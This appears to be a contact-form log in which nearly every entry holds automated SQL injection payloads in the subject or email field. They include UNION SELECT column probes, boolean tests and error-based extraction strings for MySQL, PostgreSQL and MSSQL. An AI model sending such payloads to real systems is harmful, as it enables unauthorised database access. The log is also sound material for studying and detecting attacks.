+++ 2022-01-20 05:41:04 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YJWQ, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:04 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fmfh, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:05 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RqMe, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:05 AM -- Email from: 1, -- subject: 1 ORDER BY 1-- bYJD, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:05 AM -- Email from: 1, -- subject: 1 ORDER BY 7890-- NIlp, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:06 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL-- apHK, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:06 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL-- KLaW, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:07 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL-- LDtA, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:07 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL-- MGEn, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:08 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ZtNk, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:08 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- YGuS, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:08 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- phnH, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:09 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gHPc, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:09 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bXqV, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:10 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IlzO, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:10 AM -- Email from: 1, -- subject: 1') ORDER BY 1-- Tjau, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:11 AM -- Email from: 1, -- subject: 1') ORDER BY 2839-- UVWS, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:11 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL-- yxWU, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:11 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL-- Epfv, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:12 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL-- QKqw, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:12 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL-- pndn, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:13 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- QKar, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:13 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- TaDx, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:14 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AtQu, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:14 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aYua, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:15 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gpDw, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:15 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DvNn, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:15 AM -- Email from: 1, -- subject: 1' ORDER BY 1-- BJAq, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:16 AM -- Email from: 1, -- subject: 1' ORDER BY 3535-- zTOX, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:16 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL-- ELfz, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:17 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL-- SzKu, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:17 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL-- BMEJ, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:18 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL-- lBgU, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:18 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- OzYc, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:18 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- pevm, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:19 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mMuI, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:19 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kjlp, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:20 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bwmZ, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:20 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OUhs, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:21 AM -- Email from: 1, -- subject: 1%' ORDER BY 1-- QVTe, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:21 AM -- Email from: 1, -- subject: 1%' ORDER BY 4308-- qIWt, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:22 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL-- FNiC, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:22 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL-- ukKq, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:22 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL-- xSdw, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:23 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- woaE, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:23 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- DGdf, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:24 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- onac, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:24 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZWXV, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:25 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iLRx, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:25 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- btgM, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:26 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fPyY, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:26 AM -- Email from: 1, -- subject: 1) ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:27 AM -- Email from: 1, -- subject: 1) ORDER BY 2467#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:27 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:28 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:28 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:29 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:29 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:30 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:30 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:30 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:31 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:31 AM -- Email from: 1, -- subject: 1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:32 AM -- Email from: 1, -- subject: 1 ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:32 AM -- Email from: 1, -- subject: 1 ORDER BY 3532#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:33 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:33 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:33 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:34 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:34 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:35 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:35 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:35 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:36 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:36 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:37 AM -- Email from: 1, -- subject: 1 ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:37 AM -- Email from: 1, -- subject: 1 ORDER BY 9882#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:38 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:38 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:38 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:39 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:39 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:40 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:40 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:41 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:41 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:41 AM -- Email from: 1, -- subject: 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:42 AM -- Email from: 1, -- subject: 1') ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:42 AM -- Email from: 1, -- subject: 1') ORDER BY 5107#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:43 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:43 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:44 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:44 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:44 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:45 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:45 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:46 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:46 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:47 AM -- Email from: 1, -- subject: 1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:47 AM -- Email from: 1, -- subject: 1' ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:47 AM -- Email from: 1, -- subject: 1' ORDER BY 4377#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:48 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:48 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:49 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:49 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:50 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:50 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:50 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:51 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:51 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:52 AM -- Email from: 1, -- subject: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:52 AM -- Email from: 1, -- subject: 1%' ORDER BY 1#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:53 AM -- Email from: 1, -- subject: 1%' ORDER BY 4602#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:53 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:53 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:54 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:54 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:55 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:55 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:56 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:56 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:56 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:57 AM -- Email from: 1, -- subject: 1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#, -- email: 1, -- Message is: 
+++ 2022-01-20 05:41:57 AM -- Email from: 1, -- subject: 1, -- email: 5753, -- Message is: 
+++ 2022-01-20 05:41:58 AM -- Email from: 1, -- subject: 1, -- email: 1'.(&quot;)'(,.,, -- Message is: 
+++ 2022-01-20 05:41:58 AM -- Email from: 1, -- subject: 1, -- email: 1'MdDybB&lt;'&quot;&gt;gmLXhb, -- Message is: 
+++ 2022-01-20 05:42:01 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 9426=8818 AND (7687=7687, -- Message is: 
+++ 2022-01-20 05:42:01 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 7361=7361 AND (2906=2906, -- Message is: 
+++ 2022-01-20 05:42:02 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 3215=6145, -- Message is: 
+++ 2022-01-20 05:42:02 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 7361=7361, -- Message is: 
+++ 2022-01-20 05:42:03 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 6463=2367-- XsTo, -- Message is: 
+++ 2022-01-20 05:42:03 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 7361=7361-- mGdJ, -- Message is: 
+++ 2022-01-20 05:42:03 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 3870=4353 AND ('iTzL'='iTzL, -- Message is: 
+++ 2022-01-20 05:42:04 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 7361=7361 AND ('PFuA'='PFuA, -- Message is: 
+++ 2022-01-20 05:42:04 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 1784=8132 AND 'QIxs'='QIxs, -- Message is: 
+++ 2022-01-20 05:42:10 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 7361=7361 AND 'ioJt'='ioJt, -- Message is: 
+++ 2022-01-20 05:42:10 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 3433=2049 AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:11 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 7361=7361 AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:11 AM -- Email from: 1, -- subject: 1, -- email: (SELECT (CASE WHEN (2061=9539) THEN 2061 ELSE 2061*(SELECT 2061 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- Message is: 
+++ 2022-01-20 05:42:12 AM -- Email from: 1, -- subject: 1, -- email: (SELECT (CASE WHEN (1327=1327) THEN 1327 ELSE 1327*(SELECT 1327 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)), -- Message is: 
+++ 2022-01-20 05:42:12 AM -- Email from: 1, -- subject: 1, -- email: 1) AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8500=8500, -- Message is: 
+++ 2022-01-20 05:42:12 AM -- Email from: 1, -- subject: 1, -- email: 1 AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a), -- Message is: 
+++ 2022-01-20 05:42:13 AM -- Email from: 1, -- subject: 1, -- email: 1 AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- mkBA, -- Message is: 
+++ 2022-01-20 05:42:13 AM -- Email from: 1, -- subject: 1, -- email: 1') AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('juok'='juok, -- Message is: 
+++ 2022-01-20 05:42:14 AM -- Email from: 1, -- subject: 1, -- email: 1' AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'dyiv'='dyiv, -- Message is: 
+++ 2022-01-20 05:42:14 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND (SELECT 7123 FROM(SELECT COUNT(*),CONCAT(0x7176767071,(SELECT (ELT(7123=7123,1))),0x7171767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:15 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND (1895=1895, -- Message is: 
+++ 2022-01-20 05:42:15 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC), -- Message is: 
+++ 2022-01-20 05:42:15 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC)-- IFyw, -- Message is: 
+++ 2022-01-20 05:42:16 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND ('uOtC'='uOtC, -- Message is: 
+++ 2022-01-20 05:42:16 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND 'fDAW'='fDAW, -- Message is: 
+++ 2022-01-20 05:42:17 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 1476=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (1476=1476) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'=', -- Message is: 
+++ 2022-01-20 05:42:17 AM -- Email from: 1, -- subject: 1, -- email: 1) AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND (3055=3055, -- Message is: 
+++ 2022-01-20 05:42:18 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))), -- Message is: 
+++ 2022-01-20 05:42:18 AM -- Email from: 1, -- subject: 1, -- email: 1 AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113)))-- qnoT, -- Message is: 
+++ 2022-01-20 05:42:18 AM -- Email from: 1, -- subject: 1, -- email: 1') AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND ('EKIo'='EKIo, -- Message is: 
+++ 2022-01-20 05:42:19 AM -- Email from: 1, -- subject: 1, -- email: 1' AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'qzoS'='qzoS, -- Message is: 
+++ 2022-01-20 05:42:19 AM -- Email from: 1, -- subject: 1, -- email: 1%' AND 9873=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9873=9873) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND '%'=', -- Message is: 
